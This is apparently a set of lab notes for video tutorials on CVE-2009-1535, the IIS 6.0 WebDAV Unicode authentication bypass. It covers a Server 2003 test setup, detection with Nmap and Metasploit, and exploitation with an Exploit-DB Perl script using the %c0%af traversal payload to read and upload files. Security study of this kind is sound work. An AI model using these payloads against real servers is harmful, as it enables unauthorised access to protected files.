
CVE-2009-1535  |  IIS 6.0 WebDAV Unicode Authentication Bypass

Part 1: https://www.youtube.com/watch?v=DRxaEvuwQbA

Part 2: https://www.youtube.com/watch?v=mz8DlKZyXTk

--------------

CVE-2009-1535 IIS 6.0 WebDAV Unicode Authentication Bypass

https://www.cvedetails.com/cve/CVE-2009-1535/

https://www.rapid7.com/db/modules/auxiliary/scanner/http/dir_webdav_unicode_bypass

--------------

### Part 1 

1. On Server 2003 machine, create the following folder structure:
```
C:\demo1\demo11\secret111.txt
C:\demo2\demo22\secret222.txt
```
2. Enable WebDAV...
```
Default Web Site > New > Virtual Directory > Alias => intranet1
Default Web Site > New > Virtual Directory > Alias => intranet2

Web Site Properties > Home Directory > Read + Write + Directory browsing 
		    > Directory Security > Authentication Method > only Windows Authenticated Users can access this 
```
3. Testing authentication method

Try to access the website/file on victim machine
http://192.168.50.3/intranet1/demo1/demo11/secret111.txt

Try to access the website/file from Kali machine
http://192.168.50.3/intranet2/demo2/demo22/secret222.txt

4. Use the following scripts to check the vulnerability

Option 1: using Nmap

> nmap --script http-iis-webdav-vuln -p 80 192.168.50.3

Need to add "intranet1" + "intranet2" manually into the dictionary file
```
# nmap --script http-iis-webdav-vuln --script-args=webdavfolder=intranet1 -p 80 192.168.50.3
# nmap --script http-iis-webdav-vuln --script-args=webdavfolder=intranet2 -p 80 192.168.50.3
```
Option 2: using Metasploit module
```
msf> use auxiliary/scanner/http/dir_webdav_unicode_bypass
```
Need to add "intranet1" + "intranet2" manually into the dictionary file
```
# echo intranet1 >> /usr/share/metasploit-framework/data/wmap/wmap_dirs.txt
# echo intranet2 >> /usr/share/metasploit-framework/data/wmap/wmap_dirs.txt
```
Why does Directory traversal attack %C0%AF work?

https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work

### Part 2 

5. Exploit

https://www.exploit-db.com/exploits/8806/

perl webdav_bypass.pl 192.168.50.3 intranet1/%c0%af
```
> path
```
Copy XML content to temp.html > open with Web browser

perl webdav_bypass.pl 192.168.50.3 intranet1/%c0%af/demo1/demo11/secret111.txt
```
> source
```
perl webdav_bypass.pl 192.168.50.3 intranet1/%c0%af/demo1/demo11/secret111.txt
```
> put  =>  /root/pm.txt
```
Try to access that file from local/remote machine (my_file.txt)

http://192.168.50.3/intranet1/demo1/demo11/my_file.txt

